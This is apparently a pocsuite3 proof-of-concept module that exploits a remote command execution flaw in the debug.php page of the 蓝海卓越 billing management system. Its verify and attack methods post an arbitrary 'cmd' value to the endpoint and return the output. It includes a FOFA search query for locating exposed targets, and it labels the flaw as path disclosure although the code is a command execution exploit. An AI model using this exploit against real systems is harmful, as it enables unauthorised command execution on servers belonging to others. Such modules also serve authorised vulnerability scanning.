"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import re, base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '12'  
    author = ['PeiQi']
    name = '蓝海卓越 计费管理系统 debug.php 远程命令执行漏洞'
    vulType = VUL_TYPE.PATH_DISCLOSURE
    desc = '''蓝海卓越计费管理系统 debug.php 存在命令调试页面，导致攻击者可以远程命令执行
    '''
    appPowerLink = '蓝海卓越'
    appName = '蓝海卓越计费管理系统'
    appVersion = '未知版本'
    fofa_dork = {'fofa': 'title=="蓝海卓越计费管理系统"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString("id", description='命令执行自定义命令')
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/debug.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = "cmd=" + self.get_option("cmd")
        try:
            resp = requests.post(url, data=data, headers=headers, timeout=5)
            if "uid=" in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("cmd")
                result['VerifyInfo']['Response'] = resp.text
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/debug.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = "cmd=" + self.get_option("cmd")
        try:
            resp = requests.post(url, data=data, headers=headers, timeout=5)
            if resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("cmd")
                result['VerifyInfo']['Response'] = resp.text
        except Exception as ex:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)